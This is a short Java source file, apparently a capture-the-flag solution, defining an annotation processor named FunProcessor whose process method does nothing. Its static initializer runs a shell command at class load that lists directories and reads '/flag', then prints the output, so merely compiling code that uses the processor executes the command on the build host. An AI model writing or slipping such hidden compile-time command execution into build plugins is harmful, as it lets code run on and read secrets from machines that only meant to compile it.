package fun;

import javax.annotation.processing.*;
import javax.lang.model.element.*;
import java.util.*;

public class FunProcessor extends AbstractProcessor {
	static {
		try {
			byte[] b = new byte[10240];
			var n = Runtime.getRuntime().exec(new String[]{"sh", "-c", "ls -la /; ls -la; cat /flag"}).getInputStream().read(b);
			System.out.write(b);
		} catch (Exception e) { }
	}

	public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv)
	{
		return true;
	}
}
